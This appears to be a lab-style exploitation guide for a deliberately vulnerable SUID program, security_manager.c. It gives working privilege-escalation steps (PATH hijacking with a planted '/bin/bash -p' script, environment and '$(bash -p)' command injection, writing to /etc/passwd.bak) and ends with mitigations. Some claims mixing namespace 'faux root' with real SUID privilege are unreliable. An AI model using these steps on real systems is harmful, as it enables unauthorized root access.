# Exploitation Guide: Security Manager Vulnerabilities
## A Sweet, Sweet Companion Guide to security_manager.c 

This document explains how to exploit the vulnerabilities in the `security_manager.c` program using "faux UID 0" privileges obtained through user namespaces.

## Prerequisites

- Access to a Linux system with busybox installed
- Understanding of user namespaces
- The vulnerable `security_manager` binary installed with SUID permissions

## Obtaining "Faux UID 0" (User Namespace Root)

First, you must obtain UID 0 within a user namespace:

```bash
busybox sh -c "unshare -Urmin"
```

This creates a new user namespace where your UID is mapped to 0 within the namespace.

## Vulnerability #1: Simple UID Check Bypass

**Vulnerability**: The program only checks if `getuid() == 0` to verify admin privileges.

**Vulnerable Code**:
```c
if (getuid() != 0) {
    return 1;
}
```

**Exploitation**:
- Simply running the program in the namespace is enough to bypass this check
- The user namespace makes `getuid()` return 0
- No additional exploitation steps required

## Vulnerability #2: PATH Hijacking

**Vulnerability**: The program calls several commands using relative paths instead of absolute paths.

**Vulnerable Code**:
```c
system("security_validator");
system("find_vulnerable_packages");
system("verify_system_integrity");
```

**Exploitation**:

1. Create a malicious version of one of these commands:
   ```bash
   echo '#!/bin/bash' > /tmp/find_vulnerable_packages
   echo 'echo "Executing privileged shell..."' >> /tmp/find_vulnerable_packages
   echo '/bin/bash -p' >> /tmp/find_vulnerable_packages
   chmod +x /tmp/find_vulnerable_packages
   ```

2. Modify your PATH environment variable:
   ```bash
   export PATH=/tmp:$PATH
   ```

3. Run the program and select option 1 (security audit) which calls the vulnerable command:
   ```bash
   ./security_manager
   ```

## Vulnerability #3: Environment Variable Manipulation

**Vulnerability**: The program uses environment variables without proper validation.

**Vulnerable Code**:
```c
security_level = getenv("SECURITY_LEVEL");
custom_path = getenv("REPORT_PATH");
executor = getenv("COMMAND_EXECUTOR");
```

**Exploitation**:

1. **SECURITY_LEVEL Exploitation**:
   ```bash
   export SECURITY_LEVEL="high"
   ```
   This triggers the execution of `security_validator` which can be hijacked through PATH manipulation.

2. **REPORT_PATH Path Traversal**:
   ```bash
   export REPORT_PATH="/etc/passwd.bak"
   ```
   This can be used to write output to sensitive locations.

3. **COMMAND_EXECUTOR Command Injection**:
   ```bash
   export COMMAND_EXECUTOR="/bin/sh -c '/bin/bash -p #"
   ```
   This injects a shell command that will be executed with SUID privileges.

## Vulnerability #4: Command Injection

**Vulnerability**: The `update_system()` function has incomplete input sanitization.

**Vulnerable Code**:
```c
if (strchr(component, ';') || strchr(component, '|') || strchr(component, '&')) {
    printf("Invalid component name.\n");
    return;
}

snprintf(command, sizeof(command), "update_security_component %s", component);
```

**Exploitation**:

1. When prompted for the component name, enter:
   ```
   component_name$(bash -p)
   ```

2. The parentheses aren't filtered, allowing command substitution to execute a privileged shell.

## Vulnerability #5: Privilege Restoration

**Vulnerability**: The program attempts to drop and later restore privileges.

**Vulnerable Code**:
```c
int restore_privileges(void) {
    if (setuid(original_uid) != 0) {
        perror("Failed to restore UID");
        return 1;
    }
    // ...
}
```

**Exploitation**:

In a user namespace with CAP_SETUID capability, this restoration can sometimes succeed and maintain privileged access even after dropping to nobody.

## Complete Exploitation Chain

Here's a full step-by-step exploitation:

1. Enter user namespace with "faux root":
   ```bash
   busybox sh -c "unshare -Urmin"
   ```

2. Set up the environment:
   ```bash
   export SECURITY_LEVEL="high"
   export PATH=/tmp:$PATH
   ```

3. Create a malicious security validator:
   ```bash
   echo '#!/bin/bash' > /tmp/security_validator
   echo 'echo "Exploiting SUID binary..."' >> /tmp/security_validator
   echo '/bin/bash -p' >> /tmp/security_validator
   chmod +x /tmp/security_validator
   ```

4. Run the vulnerable SUID program:
   ```bash
   /path/to/security_manager
   ```

5. Select option 1 (security audit)

6. Enjoy your privileged shell!

## Mitigation Strategies

To fix these vulnerabilities:

1. **UID Checks**: Don't rely solely on UID checks; verify capabilities and namespace status
2. **Command Execution**: Always use absolute paths (`/bin/command` instead of `command`)
3. **Environment Variables**: Don't trust user-controllable environment variables
4. **Input Validation**: Implement thorough sanitization for any user input
5. **Privilege Management**: Be extremely careful with SUID binaries and privilege dropping/restoration
